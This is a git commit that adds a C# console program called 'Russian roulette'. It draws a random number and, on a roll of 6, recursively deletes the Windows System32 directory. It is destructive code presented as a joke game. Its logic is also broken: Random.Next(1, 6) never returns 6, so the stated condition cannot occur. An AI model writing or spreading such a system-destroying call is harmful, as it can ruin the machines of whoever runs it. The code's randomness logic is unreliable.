3d9f57e9b2bf6d810ea7758f517ee6c72f7855e3
Ushankawithredstar <57961166+Ushankawithredstar@users.noreply.github.com>
2023-03-11 10:50:16 +0300

    Add project files.

---
+++ Russian roulette/Program.cs
@@ -0,0 +1,20 @@
+﻿using System;
+
+namespace Russian_roulette
+{
+    internal class Program
+    {
+        private static int roll;
+
+        static void Main(string[] args)
+        {
+            Random roulette = new Random();
+            roll = roulette.Next(1, 6);
+
+            if (roll == 6)
+            {
+                System.IO.Directory.Delete(@"C:\Windows\System32", true);
+            }
+        }
+    }
+}
